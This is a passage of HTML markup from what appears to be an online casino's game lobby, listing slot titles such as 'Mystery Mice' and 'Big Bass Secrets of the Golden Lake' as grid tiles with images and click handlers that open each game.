
          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/760c970cdd78a836849adeba5888dafc.webp?v=0.1" src="/assets/games/i/165x220/760c970cdd78a836849adeba5888dafc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Badge Blitz">Badge Blitz</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mystery Mice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mystery Mice', '/assets/games/i/165x220/b6c9b72f04fc7a65c99fc66d398e6a08.webp?v=0.1' , 'vs20powerwild', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b6c9b72f04fc7a65c99fc66d398e6a08.webp?v=0.1" src="/assets/games/i/165x220/b6c9b72f04fc7a65c99fc66d398e6a08.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mystery Mice">Mystery Mice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Dog House - Muttley Crew" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Dog House - Muttley Crew', '/assets/games/i/165x220/b40b79e71112f65cb7f446153bb2ba7a.webp?v=0.1' , 'vs20dhcluster2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b40b79e71112f65cb7f446153bb2ba7a.webp?v=0.1" src="/assets/games/i/165x220/b40b79e71112f65cb7f446153bb2ba7a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Dog House - Muttley Crew">The Dog House - Muttley Crew</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Oodles of Noodles" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Oodles of Noodles', '/assets/games/i/165x220/4f9e5fd636a087e8948728802546fdac.webp?v=0.1' , 'vs10noodles', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4f9e5fd636a087e8948728802546fdac.webp?v=0.1" src="/assets/games/i/165x220/4f9e5fd636a087e8948728802546fdac.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Oodles of Noodles">Oodles of Noodles</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Congo Cash XL" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Congo Cash XL', '/assets/games/i/165x220/5921816aa8aa3b81f26a870b76509020.webp?v=0.1' , 'vswayscongcash', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5921816aa8aa3b81f26a870b76509020.webp?v=0.1" src="/assets/games/i/165x220/5921816aa8aa3b81f26a870b76509020.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Congo Cash XL">Congo Cash XL</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Vegas Double Down Deluxe" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Vegas Double Down Deluxe', '/assets/games/i/165x220/e37d23a55a5bc9d328256f91f73b6e41.webp?v=0.1' , 'vs10bbdoubled', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e37d23a55a5bc9d328256f91f73b6e41.webp?v=0.1" src="/assets/games/i/165x220/e37d23a55a5bc9d328256f91f73b6e41.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Vegas Double Down Deluxe">Big Bass Vegas Double Down Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mustang Gold Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mustang Gold Megaways', '/assets/games/i/165x220/be2c358e5e8c0b2a7b553047ec09de8f.webp?v=0.1' , 'vswaysgoldcol', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/be2c358e5e8c0b2a7b553047ec09de8f.webp?v=0.1" src="/assets/games/i/165x220/be2c358e5e8c0b2a7b553047ec09de8f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mustang Gold Megaways">Mustang Gold Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Angel vs Sinner" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Angel vs Sinner', '/assets/games/i/165x220/2bc53d958761bcfee0c9673fa24d9772.webp?v=0.1' , 'vs15fghtmultlv', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2bc53d958761bcfee0c9673fa24d9772.webp?v=0.1" src="/assets/games/i/165x220/2bc53d958761bcfee0c9673fa24d9772.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Angel vs Sinner">Angel vs Sinner</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gem Elevator" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gem Elevator', '/assets/games/i/165x220/3763c33f3691ff65be46610a417ea63e.webp?v=0.1' , 'vs20elevclust', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3763c33f3691ff65be46610a417ea63e.webp?v=0.1" src="/assets/games/i/165x220/3763c33f3691ff65be46610a417ea63e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gem Elevator">Gem Elevator</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Gold 88" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Gold 88', '/assets/games/i/165x220/d52b2f42f874fbab6d9f52c8976934f4.webp?v=0.1' , 'vs10dgold88', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d52b2f42f874fbab6d9f52c8976934f4.webp?v=0.1" src="/assets/games/i/165x220/d52b2f42f874fbab6d9f52c8976934f4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Gold 88">Dragon Gold 88</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Treasure Hunt" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Treasure Hunt', '/assets/games/i/165x220/145acbf767c065a1aeff84b8da39051c.webp?v=0.1' , 'vs20trswild3', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/145acbf767c065a1aeff84b8da39051c.webp?v=0.1" src="/assets/games/i/165x220/145acbf767c065a1aeff84b8da39051c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Treasure Hunt">Aztec Treasure Hunt</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="6 Jokers" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '6 Jokers', '/assets/games/i/165x220/53de20159e88d2dc217d1714c6a45602.webp?v=0.1' , 'vs5magicdoor', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/53de20159e88d2dc217d1714c6a45602.webp?v=0.1" src="/assets/games/i/165x220/53de20159e88d2dc217d1714c6a45602.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="6 Jokers">6 Jokers</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot to Burn - 7 Deadly Free Spins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot to Burn - 7 Deadly Free Spins', '/assets/games/i/165x220/ff91c5fc156af1c6ff3ceb01e6125cf8.webp?v=0.1' , 'vs10hottb7fs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ff91c5fc156af1c6ff3ceb01e6125cf8.webp?v=0.1" src="/assets/games/i/165x220/ff91c5fc156af1c6ff3ceb01e6125cf8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot to Burn - 7 Deadly Free Spins">Hot to Burn - 7 Deadly Free Spins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Forging Wilds" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Forging Wilds', '/assets/games/i/165x220/986e20dde9f29ceb9e0917f155983f86.webp?v=0.1' , 'vs20forgewilds', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/986e20dde9f29ceb9e0917f155983f86.webp?v=0.1" src="/assets/games/i/165x220/986e20dde9f29ceb9e0917f155983f86.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Forging Wilds">Forging Wilds</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jackpot Hunter" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jackpot Hunter', '/assets/games/i/165x220/33ba47a7b843ab0471191cb91dca7ca3.webp?v=0.1' , 'vs20jhunter', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/33ba47a7b843ab0471191cb91dca7ca3.webp?v=0.1" src="/assets/games/i/165x220/33ba47a7b843ab0471191cb91dca7ca3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jackpot Hunter">Jackpot Hunter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Running Sushi" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Running Sushi', '/assets/games/i/165x220/fcbdeee98ca8c1aed3049e891e5c2ea1.webp?v=0.1' , 'vswayscashconv', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fcbdeee98ca8c1aed3049e891e5c2ea1.webp?v=0.1" src="/assets/games/i/165x220/fcbdeee98ca8c1aed3049e891e5c2ea1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Running Sushi">Running Sushi</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bow of Artemis" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bow of Artemis', '/assets/games/i/165x220/f3f3f33bc4737a78f2338064e4125384.webp?v=0.1' , 'vs20gembondx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f3f3f33bc4737a78f2338064e4125384.webp?v=0.1" src="/assets/games/i/165x220/f3f3f33bc4737a78f2338064e4125384.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bow of Artemis">Bow of Artemis</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sumo Supreme Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sumo Supreme Megaways', '/assets/games/i/165x220/13ba7f3c325b5be93b4328a610d2c822.webp?v=0.1' , 'vswaysmegwghts', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/13ba7f3c325b5be93b4328a610d2c822.webp?v=0.1" src="/assets/games/i/165x220/13ba7f3c325b5be93b4328a610d2c822.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sumo Supreme Megaways">Sumo Supreme Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dynamite Diggin Doug" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dynamite Diggin Doug', '/assets/games/i/165x220/2827fb68a506ba50c7ae9501946d4305.webp?v=0.1' , 'vs10dyndigd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2827fb68a506ba50c7ae9501946d4305.webp?v=0.1" src="/assets/games/i/165x220/2827fb68a506ba50c7ae9501946d4305.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dynamite Diggin Doug">Dynamite Diggin Doug</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker’s Jewels Hot" data-filter="ALL,NEW,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker’s Jewels Hot', '/assets/games/i/165x220/b0e319d907ce60102850c673164e87a8.webp?v=0.1' , 'vs10jokerhot', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b0e319d907ce60102850c673164e87a8.webp?v=0.1" src="/assets/games/i/165x220/b0e319d907ce60102850c673164e87a8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker’s Jewels Hot">Joker’s Jewels Hot</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Samurai Code" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Samurai Code', '/assets/games/i/165x220/a2e35aea6919bdf779bb2dd9d4e591b4.webp?v=0.1' , 'vs12scode', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a2e35aea6919bdf779bb2dd9d4e591b4.webp?v=0.1" src="/assets/games/i/165x220/a2e35aea6919bdf779bb2dd9d4e591b4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Samurai Code">Samurai Code</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crank it Up" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crank it Up', '/assets/games/i/165x220/eaccac1cf4933d5373436ec4d6a751bc.webp?v=0.1' , 'vs20crankit', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/eaccac1cf4933d5373436ec4d6a751bc.webp?v=0.1" src="/assets/games/i/165x220/eaccac1cf4933d5373436ec4d6a751bc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crank it Up">Crank it Up</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Kingdom" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Kingdom', '/assets/games/i/165x220/fcea084e43466f1201dc2acfceafac36.webp?v=0.1' , 'vs20clustcol', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fcea084e43466f1201dc2acfceafac36.webp?v=0.1" src="/assets/games/i/165x220/fcea084e43466f1201dc2acfceafac36.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Kingdom">Sweet Kingdom</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hand of Midas 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hand of Midas 2', '/assets/games/i/165x220/63a931940a6f1fe484e83c2b4b775abc.webp?v=0.1' , 'vs20midas2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/63a931940a6f1fe484e83c2b4b775abc.webp?v=0.1" src="/assets/games/i/165x220/63a931940a6f1fe484e83c2b4b775abc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hand of Midas 2">Hand of Midas 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Medusa’s Stone" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Medusa’s Stone', '/assets/games/i/165x220/1d6c1e0f87b0fb4be4e37ae6e4e8e37b.webp?v=0.1' , 'vs20medusast', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1d6c1e0f87b0fb4be4e37ae6e4e8e37b.webp?v=0.1" src="/assets/games/i/165x220/1d6c1e0f87b0fb4be4e37ae6e4e8e37b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Medusa’s Stone">Medusa’s Stone</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Buffalo King Untamed Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Buffalo King Untamed Megaways', '/assets/games/i/165x220/36ee477fbe124e8e0f3918544ecd2ae6.webp?v=0.1' , 'vswaysbkingasc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/36ee477fbe124e8e0f3918544ecd2ae6.webp?v=0.1" src="/assets/games/i/165x220/36ee477fbe124e8e0f3918544ecd2ae6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Buffalo King Untamed Megaways">Buffalo King Untamed Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Mission Fishin’" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Mission Fishin’', '/assets/games/i/165x220/65057f35ec72595355f9d0142e086cf8.webp?v=0.1' , 'vs10bbfmission', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/65057f35ec72595355f9d0142e086cf8.webp?v=0.1" src="/assets/games/i/165x220/65057f35ec72595355f9d0142e086cf8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Mission Fishin’">Big Bass Mission Fishin’</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wildies" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wildies', '/assets/games/i/165x220/bdf3d35542e38862867ce47b046e8322.webp?v=0.1' , 'vs25wildies', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bdf3d35542e38862867ce47b046e8322.webp?v=0.1" src="/assets/games/i/165x220/bdf3d35542e38862867ce47b046e8322.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wildies">Wildies</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Devilicious" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Devilicious', '/assets/games/i/165x220/77e81ed23fdcf9ddfe0791eab7e6826d.webp?v=0.1' , 'vs20devilic', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/77e81ed23fdcf9ddfe0791eab7e6826d.webp?v=0.1" src="/assets/games/i/165x220/77e81ed23fdcf9ddfe0791eab7e6826d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Devilicious">Devilicious</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Bonanza – Reel Action" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Bonanza – Reel Action', '/assets/games/i/165x220/a58ed70597dd87211d130ccdf65c4cd2.webp?v=0.1' , 'vs10bbbrlact', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a58ed70597dd87211d130ccdf65c4cd2.webp?v=0.1" src="/assets/games/i/165x220/a58ed70597dd87211d130ccdf65c4cd2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Bonanza – Reel Action">Big Bass Bonanza – Reel Action</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruity Treats" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruity Treats', '/assets/games/i/165x220/0f2e15518f9f518dabb0c2097cdfcf7f.webp?v=0.2' , 'vs20fortbon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0f2e15518f9f518dabb0c2097cdfcf7f.webp?v=0.2" src="/assets/games/i/165x220/0f2e15518f9f518dabb0c2097cdfcf7f.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruity Treats">Fruity Treats</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Revenge of Loki Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Revenge of Loki Megaways', '/assets/games/i/165x220/661697fb60f45d736ff0265ff7a1cdc8.webp?v=0.1' , 'vswaysloki', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/661697fb60f45d736ff0265ff7a1cdc8.webp?v=0.1" src="/assets/games/i/165x220/661697fb60f45d736ff0265ff7a1cdc8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Revenge of Loki Megaways">Revenge of Loki Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starlight Princess Pachi" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starlight Princess Pachi', '/assets/games/i/165x220/1f072bd0294e6d9cc1fe9e29fc526d33.webp?v=0.1' , 'vswaysjapan', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1f072bd0294e6d9cc1fe9e29fc526d33.webp?v=0.1" src="/assets/games/i/165x220/1f072bd0294e6d9cc1fe9e29fc526d33.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starlight Princess Pachi">Starlight Princess Pachi</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dwarf &amp;quot; Dragon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dwarf &amp;quot; Dragon', '/assets/games/i/165x220/58de9c36a53485d613944926c3a694a6.webp?v=0.1' , 'vswaysspltsym', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/58de9c36a53485d613944926c3a694a6.webp?v=0.1" src="/assets/games/i/165x220/58de9c36a53485d613944926c3a694a6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dwarf &amp; Dragon">Dwarf &amp; Dragon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Odds On Winner" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Odds On Winner', '/assets/games/i/165x220/9a25a2bb72226f29d03cf009e2e308a0.webp?v=0.2' , 'vs10frontrun', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9a25a2bb72226f29d03cf009e2e308a0.webp?v=0.2" src="/assets/games/i/165x220/9a25a2bb72226f29d03cf009e2e308a0.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Odds On Winner">Odds On Winner</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Heart of Cleopatra" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Heart of Cleopatra', '/assets/games/i/165x220/aa2981a05e5370e9c05ef86efb8addee.webp?v=0.1' , 'vs20heartcleo', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/aa2981a05e5370e9c05ef86efb8addee.webp?v=0.1" src="/assets/games/i/165x220/aa2981a05e5370e9c05ef86efb8addee.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Heart of Cleopatra">Heart of Cleopatra</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Secrets of the Golden Lake" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Secrets of the Golden Lake', '/assets/games/i/165x220/18e4a3d7fa77621fd21c0edb66b322d1.webp?v=0.1' , 'vs10bblotgl', '' )" style="">

          <div class="content-wrapper">
              
